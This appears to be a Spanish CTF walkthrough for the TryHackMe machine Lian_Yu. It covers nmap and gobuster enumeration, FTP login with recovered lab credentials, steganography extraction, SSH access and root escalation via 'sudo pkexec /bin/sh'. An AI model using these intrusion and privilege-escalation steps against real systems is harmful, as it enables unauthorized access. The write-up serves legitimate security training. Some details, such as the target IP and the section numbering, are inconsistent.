## **Tutorial: Explotación de la máquina Lian_Yu en TryHackMe**


## 1. Conexión a la VPN de TryHackMe

Para poder acceder a las máquinas del laboratorio es necesario conectarse primero a la VPN de TryHackMe. Esto crea un túnel cifrado entre la máquina Kali y la red privada del laboratorio.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali ejecutamos el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```
Si este no funciona, probar el west-3-
Si la conexión se establece correctamente aparecerá el mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la VPN se ha establecido correctamente.

### 1.2 Verificación de la conexión

Para comprobar que la conexión está activa ejecutamos:

```bash
ip a
```

Esto mostrará una interfaz de red llamada tun0, que corresponde a la conexión VPN con TryHackMe.

## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo utilizando Nmap, una herramienta fundamental para el reconocimiento en auditorías de seguridad.

Se ejecuta el siguiente comando:

Escaneo completo de puertos:

```bash
nmap -p- -T4 10.128.145.75
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/nmap.png)

## 3. Enumeración del servicio web

Durante el escaneo se identifica un servicio HTTP en ejecución.

Se accede mediante navegador:

```bash
http://10.128.145.75
```

![url](Maquina_de_Linux/Lian_Yu/imagenes/url.png)

No encontramos nada.


## 4. Enumeración de directorios

Se realiza fuerza bruta de directorios web:

```bash
gobuster dir -u http://10.128.145.75 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/gobuster.png)

Durante la enumeración se descubre el directorio:

```bash
http://10.128.145.75/island/
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/url2.png)

## 5. Análisis del código fuente

Se inspecciona el código fuente de la página y se encuentra un mensaje oculto:

```bash
<!-- go!go!go! -->
```

Y un texto relevante:

```bash
The Code Word is: vigilante
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/codigofuente.png)


## 6. Obtención del code word

Se identifica el código necesario para avanzar:

```bash
vigilante
```


## 7. Enumeración avanzada dentro de /island

Tras obtener el code word vigilante, se continúa con la enumeración del directorio /island para descubrir posibles rutas ocultas.

Se utiliza Gobuster:

```bash
gobuster dir -u http://10.128.145.75/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/gobuster2.png)


## 8. Descubrimiento de directorio oculto

Durante la enumeración se identifica un recurso importante:

```bash
/island/2100
```

Este directorio no es accesible desde navegación directa y contiene información relevante para el progreso de la máquina.


## 9. Acceso al directorio /2100

Se accede manualmente desde el navegador:

```bash
http://10.128.145.75/island/2100
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/url3.png)


Dentro se encuentra un video, miramos el codigo fuente y mencionan algo de un ticket.

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/codigofuente2.png)

Probamos a buscar directorios escondidos de nuevo para ver si encontramos algo.

```bash
gobuster dir -u http://10.128.145.75/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/gobuster3.png)

Encontramos esta ruta:

```bash
/green_arrow.ticket 
```

Encontramos una posible contraseña: RTy8yhBQdscX

Parece que puede estar encriptada, vamos a probar con cyberchef para ver si sale algo.

Buscamos from base58 y ponemos la contraseña y sale esto:

```bash
!#th3h00d
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/base58.png)


## 10. Acceso al servicio FTP

Con la información recopilada anteriormente, se accede al servicio FTP:

```bash
ftp 10.128.145.75
```

Credenciales:

Usuario: vigilante
Contraseña: !#th3h00d

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/ftp.png)


## 11. Enumeración dentro del FTP

Una vez dentro del FTP, se listan los archivos disponibles:

```bash
ls
```

Se observan archivos de interés, normalmente imágenes o ficheros ocultos.

Nos movemos a esta caperta que tiene espacio:

```bash
lcd /media/sf_carpetakali
```

Se descargan:

```bash
get aa.jpg
get Queen's_Gambit.png
get Leave_me_alone.png
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/get.png)


## 12. Navegación en el FTP

Tras hacer:

```bash
cd ..
ls
```

Se observan dos directorios:

```bash
slade
vigilante
```

El usuario actual es vigilante, pero el directorio interesante suele ser:

```bash
slade (posible siguiente usuario)
```

## 14. Análisis de archivos descargados

Dado que no se puede acceder a slade, el siguiente paso consiste en analizar los archivos descargados previamente:

```bash
aa.jpg
Queen's_Gambit.png
Leave_me_alone.png
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/codigofuente.png)


## 15. Análisis de los archivos descargados

Una vez descargados los ficheros desde el FTP, se procede a su análisis para identificar posibles datos ocultos o pistas relevantes.

Archivos obtenidos:

```bash
aa.jpg
Queen's_Gambit.png
Leave_me_alone.png
```

## 16. Identificación del formato real con xxd

Antes de analizarlos como imágenes, se inspecciona su contenido en hexadecimal para comprobar su estructura real:

```bash
xxd aa.jpg | head
xxd "Queen's_Gambit.png" | head
xxd Leave_me_alone.png | head
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/imagenformato.png)

Esto permite verificar:

si el archivo coincide con su extensión real
si ha sido renombrado
si contiene firmas válidas de imagen


## 17. Corregir formato de las imagenes

Observamos que las imagenes que descargamos y analizamos no coincide el farmato una de ellas. Vamos a usar una página para corregirlo y ver la imagen.

Entramos en la página:

```bash
https://hexed.it
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/corregirformato.png)

Vamos a poner los números asi:

```bash
89 50 4E 47 0D 0A 1A 0A
```

Después de arreglar el formato, vamos a exportarlo y se verá la imagen. vemos que la contraseña es:password


## 18. Extracción con steghide

Una vez identificada la contraseña en la imagen corregida, se procede a comprobar si el archivo aa.jpg contiene información oculta mediante esteganografía.

Se utiliza steghide para inspeccionar el archivo:

```bash
steghide info aa.jpg -p password
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/steghide.png)

El análisis revela que el archivo contiene información oculta, indicando la presencia de un fichero embebido:

```bash
ss.zip
```

## 19. Extracción del contenido oculto

Se procede a extraer los datos ocultos dentro de la imagen:

```bash
steghide extract -sf aa.jpg
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/steghide2.png)

Tras la ejecución del comando, se obtiene un archivo comprimido oculto que contiene información relevante para la continuación del reto.

```bash
unzip ss.zip
```

Luego vemos lo que hay dentro del archivo.

```bash
cat passwd.txt
```

Vemos una nota con el nombre de Oliver, miramos otro archivo.

```bash
cat shado
```

Dentro del archivo aparece una posible contraseña: M3tahuman


## 20. Acceso por SSH

Con la información obtenida, se prueba el acceso al sistema utilizando el usuario identificado previamente durante la enumeración del FTP:

```bash
ssh slade@10.129.151.19
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/ssh.png)

Se introduce la contraseña:

```bash
M3tahuman
```

La autenticación es correcta y se obtiene acceso al sistema como el usuario slade.

## 21. Escalada de privilegios

Una vez dentro del sistema, se procede a enumerar los permisos del usuario:

```bash
sudo -l
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/sudo-l.png)

El resultado muestra que el usuario puede ejecutar el binario:

```bash
/usr/bin/pkexec
```

## 22. Obtención de root

Según la técnica documentada en GTFOBins, es posible escalar privilegios abusando de pkexec.

Se ejecuta el siguiente comando:

```bash
sudo pkexec /bin/sh
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/root.png)

Tras la ejecución, se obtiene una shell con privilegios de root.


## 23. Obtención de la bandera de root

Una vez obtenida la sesión SSH como el usuario slade, se procede a buscar la flag de usuario.

Primero se comprueba el usuario actual y el directorio de trabajo:

```bash
whoami
pwd
cd /root
ls
cat root.txt
```
![nmap](Maquina_de_Linux/Lian_Yu/imagenes/catroot.png)


## 24. Obtención de la bandera de user

Se revisa el directorio home del usuario:

```bash
ls /home/slade
```

Se identifica el archivo de usuario:

```bash
user.txt
```

Vamos abrir el txt para ver la flag.

```bash
cat.user.txt
```

![nmap](Maquina_de_Linux/Lian_Yu/imagenes/catuser.png)